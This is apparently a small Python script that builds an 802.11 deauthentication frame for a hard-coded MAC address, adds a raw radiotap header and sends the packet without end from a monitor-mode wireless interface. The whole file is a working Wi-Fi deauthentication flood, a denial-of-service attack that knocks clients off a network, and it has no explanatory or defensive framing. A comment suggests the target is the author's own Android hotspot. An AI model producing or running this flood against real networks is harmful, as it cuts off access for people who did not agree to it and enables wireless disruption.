import os
from time import sleep

from core.frame import DeauthenticationFrame
from core.sniffer import PacketSender

iface = "wlp4s0mon"

# random mac from android hot spot
frame = DeauthenticationFrame("a2:cf:2d:38:59:0c")
print(frame.to_bytes())

sender = PacketSender(iface)

radiotap = b"\x00\x00\x38\x00\x2f\x40\x40\xa0\x20\x08\x00\xa0\x20\x08\x00\x00" +\
    b"\x74\x2c\x2a\x01\x00\x00\x00\x00\x10\x02\x6c\x09\xa0\x00\xc4\x00" +\
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x88\x94\x2a\x01\x00\x00\x00\x00" +\
    b"\x16\x00\x11\x03\xb9\x00\xc4\x01"


while True:
    for _ in range(64):
        sender.send(radiotap + frame.to_bytes())

    # sleep(1)
